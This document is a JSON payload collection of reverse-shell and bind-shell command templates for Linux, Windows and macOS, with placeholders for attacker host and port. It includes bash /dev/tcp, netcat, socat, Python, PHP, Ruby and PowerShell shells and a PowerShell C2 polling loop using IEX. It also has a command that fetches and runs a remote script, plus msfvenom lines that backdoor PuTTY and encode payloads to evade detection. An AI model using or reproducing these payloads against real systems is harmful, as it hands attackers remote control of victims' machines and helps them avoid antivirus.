{
    "linux": {
        "bash -i": "bash -i >& /dev/tcp/{}/{} 0>&1",
        "sh -i tcp": "sh -i >& /dev/tcp/{}/{} 0>&1",
        "sh -i udp": "sh -i >& /dev/udp/{}/{} 0>&1",
        "bash 196": "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196",
        "bash read line": "exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash 5": "bash -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5",
        "nc mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f",
        "nc -e": "nc -e /bin/sh {0} {1}",
        "nc -c": "nc -c /bin/sh {0} {1}",
        "ncat -e": "ncat {0} {1} -e /bin/sh",
	"ncat udp": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {0} {1} >/tmp/f",
	"curl": "C='curl -Ns telnet://{0}:{1}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
	"rustcat": "rcat connect -s sh {0} {1}",
	"openssl": "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {0}:{1} > /tmp/s; rm /tmp/s",
	"perl no sh": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{0}:{1}\");STDIN->fdopen($c,\"r\");$~->fdopen($c,\"w\");system $_ while<>;'",
        "python3 -c": "python3 -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\"",
        "python3 -c shortened": "python3 -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"{}\",{}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
        "lua -e": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{}', '{}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
	"php exec": "php -r '$sock=fsockopen(\"{}\",{});exec(\"sh <&3 >&3 2>&3\");'",
	"php shell_exec": "php -r '$sock=fsockopen(\"{}\",{});shell_exec(\"sh <&3 >&3 2>&3\");'",
	"php system": "php -r '$sock=fsockopen(\"{}\",{});system(\"sh <&3 >&3 2>&3\");'",
	"php passthru": "php -r '$sock=fsockopen(\"{}\",{});passthru(\"sh <&3 >&3 2>&3\");'",
	"php `": "php -r '$sock=fsockopen(\"{}\",{});`sh <&3 >&3 2>&3`;'",
	"php popen": "php -r '$sock=fsockopen(\"{}\",{});popen(\"sh <&3 >&3 2>&3\", \"r\");'",
	"php proc_open": "php -r '$sock=fsockopen(\"{}\",{});$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
	"ruby": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{}\",{}))'",
	"ruby no sh": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{0}\",\"{1}\");loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts \"failed: #{{$_}}\"}}'",
	"socat": "socat TCP:{}:{} EXEC:sh",
	"socat tty": "socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane",
	"sqlite3 nc": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'",
	"nodejs": "require('child_process').exec('nc -e sh {} {}')",
	"telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF",
	"zsh": "zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
	"golang": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{0}:{1}\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
	"vlang": "echo 'import os' > /tmp/t.v && echo 'fn main() {{ os.system(\"nc -e sh {0} {1} 0>&1\") }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
        "msfvenom -p elf": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > shell.elf"
    },
    "windows": {
        "nc.exe -e": "nc.exe -e cmd.exe {} {}",
        "ncat.exe -e": "ncat.exe -e cmd.exe {} {}",
        "powershell #1": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; $client.Close()",
        "powershell #2": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII.GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "powershell #3": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;$writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + '> '));$writer.Flush();while(($i = $stream.Read($buffer, 0, 1024)) -ne 0){{; $data = $encoding.GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $writer.Write([System.Text.Encoding]::ASCII.GetBytes($sendback)); $writer.Write([System.Text.Encoding]::ASCII.GetBytes((Get-Location).Path + '> ')); $writer.Flush()}}; $client.Close()\"",
	"powershell iex": "$s='{}:{}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{{\"Authorization\"=$i}};while ($true){{$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{{\"Authorization\"=$i}});if ($c -ne 'None') {{$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{{\"Authorization\"=$i}} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')}} sleep 0.8}}",
        "python3 -c": "python3 -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{}', {}));threading.Thread(target=exec,args=('while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start();threading.Thread(target=exec,args=('while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)',globals())).start()\"",
        "lua5.1 -e": "lua5.1 -e 'local host, port = \"{}\", {} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port) while true do local cmd, status, partial = tcp:receive() if cmd then local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end end tcp:close()'",
        "conpty": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {} {}",
        "msfvenom -p exe": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > shell.exe",
        "msfvenom -p asp": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f asp > shell.asp",
	"msfvenom -p cs": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f csharp > shell.cs",
	"msfvenom -rev stageless1": "msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x86.exe - e x86/shikata_ga_nai -i 20 LHOST={} LPORT={}",
	"msfvenom -rev stageless2": "msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp -f exe-only -k - x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_reverse_putty_x64.exe -e x64/xor -i 20 LHOST={} LPORT={}",
	"msfvenom -bin stageless1": "msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x86.exe -o /root/payloads/msfvenom/msfv_bind_putty_x86.exe -e x86/shikata_ga_nai -i 20 RHOST={} LPORT={}",
	"msfvenom -bin stageless2": "msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp -f exe-only -k -x /root/payloads/putty_x64.exe -o /root/payloads/msfvenom/msfv_bind_putty_x64.exe -e x64/xor -i 20 RHOST={} LPORT={}",
	"msfvenom -raw x86-1": "msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -f raw -o /root/payloads/shellter/shellter_reverse_x86.raw -e x86/shikata_ga_nai -i 20 LHOST={} LPORT={}",
	"msfvenom -raw x86-2": "msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f raw -o /root/payloads/shellter/shellter_bind_x86.raw -e x86/shikata_ga_nai -i 20 RHOST={} LPORT={}"
    },
    "macos": {
        "bash -i": "bash -i >& /dev/tcp/{}/{} 0>&1",
        "sh -i": "sh -i >& /dev/tcp/{}/{} 0>&1",
        "nc -e": "nc -e /bin/sh {} {}",
        "python3 -c": "python3 -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\"",
        "perl -e": "perl -e 'use Socket;$i=\"{}\";$p={} ;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN, \"<&S\");open(STDOUT, \">&S\");open(STDERR, \">&S\");exec(\"/bin/sh -i\");'"
    }
}

